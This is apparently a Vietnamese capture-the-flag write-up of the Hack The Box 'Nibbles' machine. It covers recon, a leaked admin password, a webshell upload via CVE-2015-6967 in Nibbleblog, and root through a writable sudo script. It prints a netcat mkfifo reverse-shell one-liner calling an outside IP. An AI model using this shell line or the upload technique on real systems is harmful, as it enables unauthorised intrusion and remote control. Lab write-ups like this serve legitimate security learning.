Đây là machine ở mức độ Easy và cũng là machine đầu tiên mình own (Bú ké từ module học chứ không có tiền để chơi module thât =)))

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/e77047f3-2deb-47fa-9199-c61733074c8a)

# Recon:

## nmap:
- Sử dung  `nmap` scan port, version và service:

`nmap -sV -sc 10.129.188.19`

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/787fb4a9-1821-4fcb-a9c5-09ac6e4cdf60)

Cũng không có gì hay lắm

## Scan dir:
- Truy cập vào web và `Ctr U` ta nhận được 1 path:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/8ffe0ee3-e1c6-4520-9a4e-30b7f4c261da)

- Truy cập vào `/nibbleblog/` có vẻ cũng không có gì, có thể sẽ còn 1 path nữa trong này: Sử dung `gobuster` vì đang làm quen với nó luôn :)

`gobuster -q dir -u http://10.129.188.19/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt`

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/0d9e1093-7aa3-4567-a016-2ddf7a7efd73)

- Sau khi truy cập vào path ta chú ý được 3 path `/README`, `/content` và `/admin.php`:
  + `/README`: Tìm được version của nibble và search trên google nó 1 CVE:
  
 ![image](https://github.com/vanniichan/HackTheBox/assets/112863484/c4a08e30-16ff-458f-961d-bee3f52fdd07)

  + `/content`: Trong path này có dẫn đến 1 file xml khác thú vị. `users.xml`:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/8c8b8689-1c47-4f18-90b3-771c43101bbe)

Vậy là cf được có user là admin và chưa có đươc password. Cái này cũng vi phạm vào chính sách weak-password khi ta vào file `config.xml` và đoán được password:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/933d8760-d4f3-4566-898e-403148922167)

  + `/admin.php`: Tìm được trang login của admin và cần tìm được password để log vào: `admin:nibbles`

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/c64ede67-28e7-4e8d-9929-85944c21dcc8)

# Exploit:

## RCE:

- Như đã trình bày ở trên, nó dính CVE cụ thể CVE-2015-6967 này liên quan đế vuln `File Upload`, do đó ta sẽ tiến hành exploit dựa vào tìm các feature `Upload`:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/881d4a50-50eb-47c9-bb75-7892d75bc50f)

- Tiến hành thử upload webshell lên để xem nó có bị filter không. Tuy nhiên sau đó phải đọc file ở đâu? Câu trả lời nằm ở `/content/private/plugins/my_image` mà ta vừa [Recon](https://github.com/vanniichan/HackTheBox/edit/main/Nibbles/Wup.md#recon) ở trên:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/10049b36-85e9-4703-94c5-ec22f873fb4b)

- Upload thành công! tiếp theo sẽ tiến hành RCE:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/b7f9bf50-4a79-4381-8683-f38f05b51050)

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/f1d4e632-fa05-41cd-afe3-33115ab98b0e)

- Từ đây ta lấy được flag của user tại `user.txt`:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/890df679-d849-497b-804d-3e8e69b8e139)

## Privesc:

- Sử dụng `sudo -l` hoặc [LineEnum.sh](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh). Trên tutorial [HTB](https://academy.hackthebox.com/module/77/section/853) nó sẽ hướng dẫn dùng `LinEnum.sh` nhưng `sudo -l` hiện tại vẫn dùng được nên dùng cho nhanh:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/4eb97e44-6268-48fb-a94c-60b22946bd22)

- Từ ảnh trên ta có thể tận dụng việc path `/home/nibbler/personal/stuff/monitor.sh` có thể **chạy root mà không cần password**, tuy nhiên phải xem mình có thể viết vào file này nữa hay không. Nó full quyền luôn, thật là may mắn :)))):

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/36415020-1083-4448-970c-1d2895b5ee9f)

- Tiến hành đè shell vào và chạy file:

`echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.147 1111 >/tmp/f' | tee -a monitor.sh`

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/643ecc37-babb-42bb-95f0-ef9299322c6f)

- Vậy là leo quyền thành công, sau đó lấy flag:

![image](https://github.com/vanniichan/HackTheBox/assets/112863484/a1e34d5c-23e2-4aed-a2d2-661e09262276)

----------------------------------------
Ngoài ra còn 1 cách đó là dùng **Metasploit** để khai thác vuln này rất nhanh. Cách làm [ở đây](https://academy.hackthebox.com/module/77/section/854)

-------------------- **Own machine!** --------------------------
